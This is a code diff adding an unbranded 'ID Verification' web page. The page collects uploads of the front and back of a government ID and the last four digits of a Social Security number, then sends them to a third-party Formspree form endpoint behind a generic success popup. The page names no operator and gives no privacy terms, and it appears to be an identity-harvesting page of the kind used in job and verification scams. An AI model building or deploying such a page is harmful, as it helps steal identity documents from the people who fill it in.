@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ID Verification</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> <!-- For nice popup -->
+</head>
+<body>
+  <!-- Navbar -->
+  <nav class="navbar">
+    <div class="logo">
+      <img src="logo.jpg" alt="Logo" />
+    </div>
+  </nav>
+
+  <!-- ID Verification Section -->
+  <main class="upload-section">
+    <h1>ID Verification</h1>
+
+    <form id="verificationForm" enctype="multipart/form-data">
+      
+      <label for="idType">Select ID Type:</label>
+      <select id="idType" name="id_type" required>
+        <option value="" disabled selected>Choose an ID Type</option>
+        <option value="drivers_license">Driver’s License</option>
+        <option value="state_id">State ID Card</option>
+        <option value="passport">Passport</option>
+        <option value="green_card">Permanent Resident Card</option>
+        <option value="ead">Employment Authorization Document (EAD)</option>
+        <option value="military_id">Military ID</option>
+        <option value="tribal_id">Tribal ID Card</option>
+      </select>
+
+      <div id="uploadSection" style="display: none;">
+        <label>Upload Front of ID:</label>
+        <input type="file" name="front_id" accept="image/*,.pdf" required />
+
+        <label>Upload Back of ID:</label>
+        <input type="file" name="back_id" accept="image/*,.pdf" required />
+      </div>
+
+      <label for="ssn">Last 4 Digits of SSN:</label>
+      <input type="text" id="ssn" name="ssn_last4" maxlength="4" pattern="\d{4}" required />
+
+      <button type="submit">Submit</button>
+    </form>
+  </main>
+
+  <script>
+    // Show Upload Section after ID Type selection
+    const idTypeSelect = document.getElementById("idType");
+    const uploadSection = document.getElementById("uploadSection");
+
+    idTypeSelect.addEventListener("change", () => {
+      uploadSection.style.display = "block";
+    });
+
+    // Handle Form Submit with Popup
+    const form = document.getElementById("verificationForm");
+
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch("https://formspree.io/f/mgvkvjbq", {
+          method: "POST",
+          body: formData,
+          headers: {
+            Accept: "application/json"
+          }
+        });
+
+        if (response.ok) {
+          // Show success popup
+          Swal.fire({
+            title: 'Success!',
+            text: 'Your ID has been successfully submitted!',
+            icon: 'success',
+            confirmButtonText: 'OK'
+          });
+
+          // Reset form
+          form.reset();
+          uploadSection.style.display = "none";
+        } else {
+          Swal.fire({
+            title: 'Oops!',
+            text: 'Something went wrong. Please try again.',
+            icon: 'error',
+            confirmButtonText: 'OK'
+          });
+        }
+      } catch (error) {
+        Swal.fire({
+          title: 'Network Error!',
+          text: 'Please check your connection and try again.',
+          icon: 'error',
+          confirmButtonText: 'OK'
+        });
+      }
+    });
+  </script>
+</body>
+</html>
